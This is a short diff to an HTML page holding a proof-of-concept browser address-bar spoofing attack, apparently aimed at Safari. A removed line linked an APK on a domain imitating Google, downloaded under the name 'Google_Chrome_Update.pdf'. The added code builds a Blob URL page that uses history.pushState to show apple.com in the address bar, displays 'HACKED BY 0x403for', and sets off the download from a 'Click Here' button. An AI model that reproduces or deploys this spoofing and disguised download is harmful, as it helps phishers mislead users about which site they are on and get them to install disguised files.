@@ -21,21 +21,37 @@
 <script>
 function a(){
 	var link = document.createElement('a');
-	link.href = 'http://chrome-downloads.google.communication.unaux.com/POC.apk';
 	
-	// Ganti ekstensi jadi .pdf agar Safari mengenali sebagai PDF
+	// Ganti href dengan Blob URL yang berisi konten spoof + pushState
+	var htmlContent = '<html>' +
+		'<head><title>Apple</title>' +
+		'<style>body{margin:0;background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;text-align:center;}' +
+		'h1{font-size:72px;color:#ff0000;text-shadow:2px 2px 0 #0f0,-2px -2px 0 #00f;}' +
+		'p{font-size:20px;color:#ccc;}</style>' +
+		'<script>' +
+		'history.pushState(null, "", "https://www.apple.com");' +
+		'<' + '/script></head>' +
+		'<body>' +
+		'<h1>HACKED BY 0x403for</h1>' +
+		'<p>Your security is an illusion</p>' +
+		'<p style="font-size:14px;color:#666;">Address bar: https://www.apple.com</p>' +
+		'</body></html>';
+	
+	var blob = new Blob([htmlContent], {type: 'text/html'});
+	var blobUrl = URL.createObjectURL(blob);
+	
+	link.href = blobUrl;
 	link.download = 'Google_Chrome_Update.pdf';
 	
 	document.body.appendChild(link);
 	link.click();
 	document.body.removeChild(link);
 
-	// Fallback untuk Safari: buka langsung di tab baru sebagai navigasi user-initiated
 	setTimeout(function(){
 		window.location.href = link.href;
 	}, 100);
 }
 </script>
-<center><input type="button" class="button" value="Download POC PDF" onclick="a()"></center>
+<center><input type="button" class="button" value="Click Here" onclick="a()"></center>
 </body>
 </html>
